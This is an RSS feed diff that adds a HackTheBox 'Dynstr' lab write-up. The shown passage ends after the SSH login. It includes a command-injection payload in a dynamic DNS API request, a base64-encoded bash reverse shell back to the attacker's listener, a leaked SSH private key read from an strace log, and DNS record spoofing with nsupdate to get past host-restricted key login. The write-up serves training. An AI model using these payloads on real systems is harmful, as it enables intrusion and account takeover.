@@ -5,7 +5,455 @@
     <link>https://fahmifj.github.io/categories/ctf/</link>
     <description>Recent content in CTF on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Thu, 14 Oct 2021 04:42:42 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 18 Oct 2021 03:04:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Dynstr</title>
+      <link>https://fahmifj.github.io/hackthebox/dynstr/</link>
+      <pubDate>Mon, 18 Oct 2021 03:04:29 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/dynstr/</guid>
+      <description>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, which allows me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after spoofing one of the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection.</description>
+      <content:encoded><![CDATA[<p>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, which allows me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after spoofing one of the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Command injection</li>
+<li>Dynamic DNS</li>
+<li>Wildcard injection</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan with <code>nmap</code> discovers 3 open ports: SSH on 22, BIND 9 DNS on 53, and an Apache web server on 80.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
+$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-dynstr 10.10.10.244
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:06 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.244
+Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.078s latency<span class="o">)</span>.
+Not shown: <span class="m">65532</span> closed ports
+Reason: <span class="m">65532</span> resets
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
+53/tcp open  domain  syn-ack ttl <span class="m">63</span>
+80/tcp open  http    syn-ack ttl <span class="m">63</span>
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 41.14 seconds
+
+→ root@kali «dynstr» «10.10.14.53» 
+$ nmap -p22,53,80 -sC -sV -oA nmap/10-tcp-allport-scripts-dynstr 10.10.10.244
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:07 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.244
+Host is up <span class="o">(</span>0.54s latency<span class="o">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
+<span class="p">|</span> dns-nsid: 
+<span class="p">|</span>_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Dyna DNS
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.76 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>On port 80, there is a company website named <strong>DYNA DNS</strong>.</p>
+<p><div class="img-container"><img src="imgs/image-20210617082250725.png" alt="image-20210617082250725"  /></div>
+</p>
+<p>This company offers a <a href="https://www.youtube.com/watch?v=rOLGvZagdC0">dynamic DNS</a> service and states that the service is still in beta. There is also shared credentials to use this service.</p>
+<p><div class="img-container"><img src="imgs/image-20210617082428463.png" alt="image-20210617082428463"  /></div>
+</p>
+<p>At the bottom of the page, it reveals another domain name: <code>dyna.htb</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210617082655557.png" alt="image-20210617082655557"  /></div>
+</p>
+<p>I will update my <code>/etc/hosts</code> with all the discovered domain names :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.244 dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb&#39;</span> 
+</code></pre></div><p>These domain points to the same site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
+$ curl -s http://10.10.10.244/ <span class="p">|</span> wc -c
+<span class="m">10909</span>
+→ root@kali «dynstr» «10.10.14.53» 
+$ <span class="k">for</span> i in dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb<span class="p">;</span> <span class="k">do</span> curl -s http://<span class="nv">$i</span>/ <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span> 
+<span class="m">10909</span>
+<span class="m">10909</span>
+<span class="m">10909</span>
+<span class="m">10909</span>
+</code></pre></div><h3 id="dns-api">DNS API</h3>
+<p>As previously stated in the website, it seems to use the dynamic DNS service, I can refer to <a href="https://www.noip.com/integrate/request">no-ip.com</a>:</p>
+<p><div class="img-container"><img src="imgs/image-20210617090837052.png" alt="image-20210617090837052"  /></div>
+</p>
+<p>To use the service, I will send a request and supply the shared credentials (<code>'dynadns:sndanyd'</code>) in the Authorization header:</p>
+<p><div class="img-container"><img src="imgs/image-20210617091044264.png" alt="image-20210617091044264"  /></div>
+</p>
+<p>It returned with <code>good</code>.</p>
+<p>With <code>dig</code>, I can confirm that my domain name has been added to the DNS entry.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53»
+$ dig @10.10.10.244 iamf.no-ip.htb
+
+<span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.no-ip.htb
+<span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">38459</span>
+<span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
+<span class="p">;;</span> WARNING: recursion requested but not available
+
+<span class="p">;;</span> OPT PSEUDOSECTION:
+<span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
+<span class="p">;</span> COOKIE: a795fc705ec31c660100000060cab226fe335467b6b169e8 <span class="o">(</span>good<span class="o">)</span>
+<span class="p">;;</span> QUESTION SECTION:
+<span class="p">;</span>iamf.no-ip.htb.                        IN      A
+
+<span class="p">;;</span> ANSWER SECTION:
+iamf.no-ip.htb.         <span class="m">30</span>      IN      A       10.10.14.53
+
+<span class="p">;;</span> Query time: <span class="m">864</span> msec
+<span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
+<span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:23:34 EDT <span class="m">2021</span>
+<span class="p">;;</span> MSG SIZE  rcvd: <span class="m">87</span>
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="identify-command-injection">Identify Command Injection</h4>
+<p>On Linux, there is a dynamic DNS utility called <a href="https://linux.die.net/man/8/nsupdate"><code>nsupdate</code></a>. If the backend uses this utility with no sanitization on the input, it is possible to do a command injection.</p>
+<p>For the first attempt, I try to submit a semicolon, and it fails the update process.</p>
+<p><div class="img-container"><img src="imgs/image-20210617091628552.png" alt="image-20210617091628552"  /></div>
+</p>
+<p>If I search for that error on Google, I will see <a href="https://stackoverflow.com/questions/46604333/nsupdate-fail-when-called-in-php-with-exec-function">this post</a> from StackOverflow, which shows how <code>nsupdate</code> is executed from PHP using the built-in <code>exec()</code> function.</p>
+<p><div class="img-container"><img src="imgs/image-20211018060424803.png" alt="image-20211018060424803"  /></div>
+</p>
+<p>By assuming that my input falls in <code>update add $MYINPUT.no-ip.htb ...</code>, I try to submit  <strong>`echo+iamf1`</strong>.<div class="img-container"><img src="imgs/image-20210617093614041.png" alt="image-20210617093614041"  /></div>
+</p>
+<p>It again responded with &ldquo;good&rdquo;.</p>
+<p>Checking with <code>dig</code> shows that my domain <code>iamf1.no-ip.htb</code> has been added to the DNS entry. This means the API is vulnerable to command injection.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53»
+$ dig @10.10.10.244 iamf1.no-ip.htb
+
+<span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf1.no-ip.htb
+<span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">65360</span>
+<span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
+<span class="p">;;</span> WARNING: recursion requested but not available
+
+<span class="p">;;</span> OPT PSEUDOSECTION:
+<span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
+<span class="p">;</span> COOKIE: 8164817dd17125330100000060cab5248a60afa8ae9615d7 <span class="o">(</span>good<span class="o">)</span>
+<span class="p">;;</span> QUESTION SECTION:
+<span class="p">;</span>iamf1.no-ip.htb.               IN      A
+
+<span class="p">;;</span> ANSWER SECTION:
+iamf1.no-ip.htb.        <span class="m">30</span>      IN      A       10.10.14.53
+
+<span class="p">;;</span> Query time: <span class="m">735</span> msec
+<span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
+<span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:36:20 EDT <span class="m">2021</span>
+<span class="p">;;</span> MSG SIZE  rcvd: <span class="m">88</span>
+</code></pre></div><p>I also assume that the update command is enclosed with <code>EOF</code>, and when I put <code>&quot;</code> to enclose it, the server response leaks how it updates the DNS entry.</p>
+<p><div class="img-container"><img src="imgs/image-20210617101554395.png" alt="image-20210617101554395"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>To avoid bad characters, I will encode the reverse shell payload with double base64.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
+$ <span class="nb">echo</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/9000 0&gt;&amp;1&#39;&#34;</span> <span class="p">|</span>base64 <span class="p">|</span>base64 -w0
+<span class="nv">WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg</span><span class="o">==</span>
+</code></pre></div><p>The final query will looks like this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">/nic/update?hostname=&#34;`echo+WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg==+|base64+-d|base64+-d|bash`+iamf.no-ip.htb&amp;myip=10.10.14.53
+</code></pre></div><p>On my listener</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53»
+$ nc -nvlp <span class="m">9000</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.53<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.244<span class="o">]</span> <span class="m">49648</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>659<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@dynstr:/var/www/html/nic$ id
+id
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div><p>I will upgrade my shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/var/www/html/nic$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@dynstr:/var/www/html/nic$ which python3
+which python3
+/usr/bin/python3
+www-data@dynstr:/var/www/html/nic$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+<span class="s1">&#39;ython3 -c &#39;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span><span class="err">&#39;</span>
+www-data@dynstr:/var/www/html/nic$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> suspended  nc -nvlp <span class="m">9000</span>
+→ root@kali «dynstr» «10.10.14.53»
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> continued  nc -nvlp <span class="m">9000</span>
+
+www-data@dynstr:/var/www/html/nic$ 
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-bindmgr">Shell as bindmgr</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Under <code>/home/bindmgr/support-case-C62796521</code>, there are several files that are readable by others.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/home$ ls -laR
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+./bindmgr:
+total <span class="m">8</span>
+drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 .ssh
+drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 support-case-C62796521
+-r-------- <span class="m">1</span> bindmgr bindmgr   <span class="m">33</span> Jun <span class="m">17</span> 10:51 user.txt
+./bindmgr/.ssh/:
+total <span class="m">8</span>
+-rw-r--r-- <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 authorized_keys
+-rw-r--r-- <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 id_rsa
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+./bindmgr/support-case-C62796521:
+total <span class="m">428</span>
+-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">237141</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.script
+-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">29312</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.timing
+-rw-r--r-- <span class="m">1</span> bindmgr bindmgr   <span class="m">1175</span> Mar <span class="m">13</span> 14:53 command-output-C62796521.txt
+-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">163048</span> Mar <span class="m">13</span> 14:52 strace-C62796521.txt
+
+./dyna:
+total <span class="m">0</span>
+</code></pre></div><p>The <code>strace-C62796521.txt</code> file contains a SSH private key.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="m">15123</span> openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/home/bindmgr/.ssh/id_rsa&#34;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> <span class="m">5</span>
+<span class="m">15123</span> fstat<span class="o">(</span>5, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0600, <span class="nv">st_size</span><span class="o">=</span>1823, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
+<span class="m">15123</span> read<span class="o">(</span>5, <span class="s2">&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span>, 4096<span class="o">)</span> <span class="o">=</span> <span class="m">1823</span>
+</code></pre></div><p>But when I try to use that key for SSH login, it asks for a password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ssh-keys» «10.10.14.53»
+$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
+bindmgr@10.10.10.244<span class="err">&#39;</span>s password:
+</code></pre></div><p>My first guess is SSH has been configured to password only, but I find that <a href="https://unix.stackexchange.com/questions/56941/what-is-the-point-of-sshd-usedns-option">UseDNS</a> is enabled here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/home$ cat /etc/ssh/sshd_config <span class="p">|</span> grep -v <span class="s1">&#39;^#&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;NF&#39;</span>
+Include /etc/ssh/sshd_config.d/*.conf
+PermitRootLogin yes
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+UseDNS yes
+AcceptEnv LANG LC_*
+Subsystem       sftp    /usr/lib/openssh/sftp-server
+</code></pre></div><p>Then if I look at the authorized keys, it seems SSH login only possible from a specific domain that starts with <code>*.infra.dyna.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys
+<span class="nv">from</span><span class="o">=</span><span class="s2">&#34;*.infra.dyna.htb&#34;</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
+</code></pre></div><h4 id="update-dns">Update DNS</h4>
+<p>Looking at the DNS configuration under <code>/etc/bind</code> reveals that <code>dyna.htb</code> is not available for customers (via API) and it uses different key (<code>/etc/bind/infra.key</code>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/etc/bind/$ cat named.conf.local
+//
+// Do any <span class="nb">local</span> configuration here
+//
+
+// Add infrastructure DNS updates.
+include <span class="s2">&#34;/etc/bind/infra.key&#34;</span><span class="p">;</span>
+zone <span class="s2">&#34;dyna.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dyna.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+zone <span class="s2">&#34;10.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;10.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+zone <span class="s2">&#34;168.192.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;168.192.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+// Enable DynDNS updates to customer zones.
+include <span class="s2">&#34;/etc/bind/ddns.key&#34;</span><span class="p">;</span>
+zone <span class="s2">&#34;dnsalias.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dnsalias.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+zone <span class="s2">&#34;dynamicdns.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dynamicdns.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+zone <span class="s2">&#34;no-ip.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;no-ip.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
+
+// *** WORK IN PROGRESS, see bindmgr.sh ***
+// include <span class="s2">&#34;/etc/bind/named.conf.bindmgr&#34;</span><span class="p">;</span>
+</code></pre></div><p>The idea here is to add a sub domain to <code>dyna.htb</code> zone, and it must be part of <code>infra.dyna.htb</code>, such as <code>iamf.infra.dyna.htb</code>. I will also point that domain to my IP so I can SSH from my machine. These all can be done with the following commands.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/etc/bind$ nsupdate -k ./infra.key
+&gt; update add iamf.infra.dyna.htb <span class="m">3600</span> A 10.10.14.53
+&gt; update add 53.14.10.10.in-addr.arpa. <span class="m">600</span> PTR iamf.infra.dyna.htb
+&gt; show
+Outgoing update query:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: UPDATE, status: NOERROR, id:      <span class="m">0</span>
+<span class="p">;;</span> flags:<span class="p">;</span> ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: <span class="m">0</span>
+<span class="p">;;</span> UPDATE SECTION:
+iamf.infra.dyna.htb.    <span class="m">0</span>       ANY     A
+iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
+53.14.10.10.in-addr.arpa. <span class="m">600</span>   IN      PTR     iamf.infra.dyna.htb.
+
+&gt; send
+</code></pre></div><p>I can confirm with dig that my domain has been added.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
+$ dig @10.10.10.244 iamf.infra.dyna.htb
+
+<span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.infra.dyna.htb
+<span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">56211</span>
+<span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
+<span class="p">;;</span> WARNING: recursion requested but not available
+
+<span class="p">;;</span> OPT PSEUDOSECTION:
+<span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
+<span class="p">;</span> COOKIE: 7d13ea1a1d5d21b90100000060cb40c0b256362f3bd3da35 <span class="o">(</span>good<span class="o">)</span>
+<span class="p">;;</span> QUESTION SECTION:
+<span class="p">;</span>iamf.infra.dyna.htb.           IN      A
+
+<span class="p">;;</span> ANSWER SECTION:
+iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
+
+<span class="p">;;</span> Query time: <span class="m">59</span> msec
+<span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
+<span class="p">;;</span> WHEN: Thu Jun <span class="m">17</span> 08:31:59 EDT <span class="m">2021</span>
+<span class="p">;;</span> MSG SIZE  rcvd: <span class="m">92</span>
+</code></pre></div><h4 id="ssh-bindmgr">SSH bindmgr</h4>
+<p>Now I can SSH login as bindmgr</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ssh-keys» «10.10.14.53»
+$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
+Last login: Tue Jun  <span class="m">8</span> 19:19:17 <span class="m">2021</span> from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
